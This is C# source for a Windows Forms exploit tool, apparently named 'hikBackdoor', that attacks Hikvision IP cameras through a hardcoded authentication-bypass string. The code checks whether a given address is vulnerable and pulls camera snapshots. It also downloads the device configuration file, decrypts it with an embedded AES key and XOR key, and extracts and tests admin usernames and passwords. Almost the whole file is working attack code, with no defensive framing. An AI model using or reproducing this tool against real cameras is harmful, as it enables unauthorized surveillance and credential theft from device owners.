using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace KDownloader_Recoded
{
    public partial class hikBackdoor : Form
    {
        public readonly string secret_key = "?auth=YWRtaW46MTEK";
        public string ipAddr = "";
        public TimeWebClient w = new TimeWebClient();
        bool curIpIsVuln = false;
        public Random rnd = new Random();
        public Thread dl;
        public bool blownAsyncDL = false;
        public hikBackdoor()
        {
            InitializeComponent();
        }

        public string processIP()
        {
            string tmp;
            tmp = ipAddr.Replace("http://", "");
            tmp = tmp.Replace("https://", "");
            tmp = tmp.Replace("/", "");
            tmp = "http://" + tmp;
            return tmp;
        }

        public bool checkVuln()
        {
            try
            {
                w.DownloadData(ipAddr + "/Security/users" + secret_key);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private void hikBackdoor_Load(object sender, EventArgs e)
        {

        }

        private void accountsBtn_Click(object sender, EventArgs e)
        {
            accountsReset ar = new accountsReset(ipAddr);
            ar.Show();
        }

        private void testVulnBtn_Click(object sender, EventArgs e)
        {
            ipAddr = ipTextbox.Text;
            ipAddr = processIP();
            curIpIsVuln = checkVuln();
            if (curIpIsVuln)
            {
                print(Color.Green, "Set IP Address (Vulnerable)");
                snapBtn.Enabled = true;
                accountsBtn.Enabled = true;
                if (!blownAsyncDL)
                {
                    confBtn.Enabled = true;
                }
            }
            else
            {
                print(Color.Red, "IP is not vulnerable!");
                snapBtn.Enabled = false;
                accountsBtn.Enabled = false;
                confBtn.Enabled = false;
            }
        }

        private void snapBtn_Click(object sender, EventArgs e)
        {
            Thread bgdl = new Thread(() => dlAndShowSnapshot());
            bgdl.IsBackground = true;
            bgdl.Start();
            print(Color.Green, "Grabbing snapshot...");
        }

        public void dlAndShowSnapshot()
        {
            try
            {
                string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
                string fname = path + "/" + RandomString(10) + ".jpg";
                w.DownloadFile(ipAddr + "/onvif-http/snapshot" + secret_key, fname);
                Process.Start(fname);
                print(Color.Green, "Got snapshot.");
            }
            catch
            {
                print(Color.Red, "Failed to get snapshot.");
            }

        }

        public string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[rnd.Next(s.Length)]).ToArray());
        }

        public void print(Color c, string text)
        {
            if (this.IsHandleCreated)
            {
                this.Invoke(new MethodInvoker(delegate ()
                {
                    output.Items.Insert(0, new colourItem(c, text));
                }));
            }
        }

        private void oDraw(object sender, DrawItemEventArgs e)
        {
            if(e.Index != -1)
            {
                colourItem item = output.Items[e.Index] as colourItem;
                if (item != null)
                {
                    Bitmap tmbmp = new Bitmap(1, 1);
                    Graphics g = Graphics.FromImage(tmbmp);

                    int width = (int)g.MeasureString(item.Message, output.Font).Width;
                    e.Graphics.DrawString(item.Message, output.Font, new SolidBrush(item.ItemColor), ((output.Width / 2) - (width / 2)), e.Index * output.ItemHeight);

                    g.Dispose();
                    tmbmp.Dispose();
                }
                else
                {

                }
            }
        }

        private void confBtn_Click(object sender, EventArgs e)
        {
            string savepath = "";
            using (SaveFileDialog dlg = new SaveFileDialog())
            {
                dlg.Title = "Save conf file";
                dlg.Filter = "Hikvision config file | *.hcon";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    savepath = dlg.FileName;
                    try 
                    {
                        confBtn.Enabled = false;
                        blownAsyncDL = true;
                        print(Color.Black, "Starting download.");
                        startMemDatDl(savepath);            
                    }
                    catch
                    {
                        print(Color.Red, "Error during download.");
                    }
                }
            }
        }

        public void startMemDatDl(string path)
        {
            rndFuncs rn = new rndFuncs();
            string rndFilePref = rn.RandomString(5);
            dl = new Thread(() => {
                w.DownloadProgressChanged += new DownloadProgressChangedEventHandler(client_DownloadProgressChanged);
                w.DownloadFileCompleted += new AsyncCompletedEventHandler(client_DownloadFileCompleted);
                w.DownloadFileAsync(new Uri(ipAddr + "/System/configurationFile?auth=YWRtaW46MTEK"), path);
            });
            dl.IsBackground = true;
            dl.Start();
        }

        public void client_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            this.BeginInvoke((MethodInvoker)delegate {
                print(Color.Black, "Downloading data: " + e.BytesReceived / 1024 + "KB of " + e.TotalBytesToReceive / 1024 + "KB");
            });
        }
        public void client_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            print(Color.DarkGreen, "Downloading data: Done");
        }

        private void decConfBtn_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "Save conf file";
                dlg.Filter = "Hikvision config file | *.hcon";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    doDecrypt(File.ReadAllBytes(dlg.FileName));
                }
            }
        }

        public void testFoundCreds(List<String> located)
        {
            if(ipAddr == "")
            {
                print(Color.Red, "IP not set! Cant test credentials.");
                foreach(string s in located)
                {
                    string[] sp = s.Split(':');
                    print(Color.DarkGreen, "Possible pass: " + sp[1]);
                    print(Color.DarkGreen, "Possible user: " + sp[0]);
                    print(Color.DarkCyan, "##########");
                }
            }
            else
            {
                print(Color.DarkGreen, "Testing possible credentials...");
                bool found = false;
                foreach (string s in located)
                {
                    string[] sp = s.Split(':');
                    if(testPossibleCreds(sp[0], sp[1]))
                    {
                        found = true;
                        print(Color.DarkCyan, "##########");
                        print(Color.DarkGreen, "Password: " + sp[1]);
                        print(Color.DarkGreen, "Username: " + sp[0]);
                        print(Color.DarkCyan, "##########");
                    }
                }
                if (!found)
                {
                    print(Color.Red, "No valid credentials found! Dumping...");
                    foreach (string s in located)
                    {
                        string[] sp = s.Split(':');
                        print(Color.DarkGreen, "Possible pass: " + sp[1]);
                        print(Color.DarkGreen, "Possible user: " + sp[0]);
                        print(Color.DarkCyan, "##########");
                    }
                }
            }
        }

        public bool testPossibleCreds(string user, string pass)
        {
            w.Credentials = new NetworkCredential(user, pass);
            try
            {
                byte[] dldata = w.DownloadData(ipAddr + "/Security/users");
                return true;
            }
            catch
            {
                return false;
            }
        }

        //########## Coped from hikvision decrypter. Also by me. ##########//
        public void doDecrypt(byte[] data)
        {
            byte[] key = { 0x73, 0x8B, 0x55, 0x44 };
            byte[] xorOutput = new byte[data.Length];

            print(Color.DarkGreen, "Decrypting...");

            byte[] decryptedData;
            try
            {
                byte[] cipherBytes = data;
                using (Aes encryptor = Aes.Create())
                {
                    encryptor.Mode = CipherMode.ECB;
                    encryptor.Padding = PaddingMode.Zeros;
                    encryptor.Key = FromHex("27-99-77-f6-2f-6c-fd-2d-91-cd-75-b8-89-ce-0c-9a");
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        decryptedData = ms.ToArray();
                    }
                }
            }
            catch
            {
                print(Color.Red, "Decrypt error!");
                return;
            }
            print(Color.DarkGreen, "Xoring...");

            for (int i = 0; i < decryptedData.Length; i++)
            {
                xorOutput[i] = (byte)(decryptedData[i] ^ key[i % key.Length]);
            }

            string output = Encoding.UTF8.GetString(xorOutput);

            print(Color.DarkGreen, "Decrypted!");
            print(Color.DarkGreen, "Searching for credentials...");

            //this concludes decrypting.

            //strip unprintable characters. seperate strings with 0x00.
            byte[] printables = new byte[] { 27, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x5c, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e };
            List<Byte> buffer = new List<Byte> { };
            bool swit = true;
            foreach (byte b in xorOutput)
            {
                if (printables.Contains(b))
                {
                    buffer.Add(b);
                    swit = true;
                }
                else
                {
                    if (swit)
                    {
                        buffer.Add(0x00);
                        swit = false;
                    }
                }
            }

            string dat = Encoding.UTF8.GetString(buffer.ToArray());
            string[] rawSplit = dat.Split((char)0x00);


            string username = "";
            string password = "";

            List<String> possibles = new List<String> { };

            int count = 0;
            foreach (string s in rawSplit)
            {
                count++;
                //every hikvision has an "admin" account.
                if(s == "admin")
                {
                    username = "admin";
                    password = rawSplit[count];

                    possibles.Add(username + ":" + password);
                }
            }

            testFoundCreds(possibles);

            if (possibles.Count() == 0)
            {
                print(Color.Orange, "Find manually.");
                print(Color.Orange, "Couldnt find credentials.");
            }

            if(cbSaveOutput.Checked || possibles.Count() == 0)
            {
                using (SaveFileDialog dlg = new SaveFileDialog())
                {
                    dlg.Title = "Save decrypted data";
                    dlg.Filter = "Text Files | *.txt";

                    if (dlg.ShowDialog() == DialogResult.OK)
                    {
                        if (cbPurgeNonprint.Checked)
                        {
                            File.WriteAllText(dlg.FileName, string.Join("\n", rawSplit));
                        }
                        else
                        {
                            File.WriteAllText(dlg.FileName, output);
                        }
                    }
                }
            }
        }

        public static byte[] Decrypt(byte[] cipherText)
        {

            byte[] cipherBytes = cipherText;
            using (Aes encryptor = Aes.Create())
            {
                encryptor.Mode = CipherMode.ECB;
                encryptor.Padding = PaddingMode.Zeros;
                encryptor.Key = FromHex("27-99-77-f6-2f-6c-fd-2d-91-cd-75-b8-89-ce-0c-9a");
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipherBytes, 0, cipherBytes.Length);
                        cs.Close();
                    }
                    cipherText = ms.ToArray();
                }
            }
            return cipherText;

        }

        public static byte[] FromHex(string hex)
        {
            hex = hex.Replace("-", "");
            byte[] raw = new byte[hex.Length / 2];
            for (int i = 0; i < raw.Length; i++)
            {
                raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return raw;
        }

        private void cbSaveOutput_CheckedChanged(object sender, EventArgs e)
        {
            if (!cbSaveOutput.Checked)
            {
                cbPurgeNonprint.Checked = false;
                cbPurgeNonprint.Enabled = false;
            }
            else
            {
                cbPurgeNonprint.Enabled = true;
            }
        }
    }
}
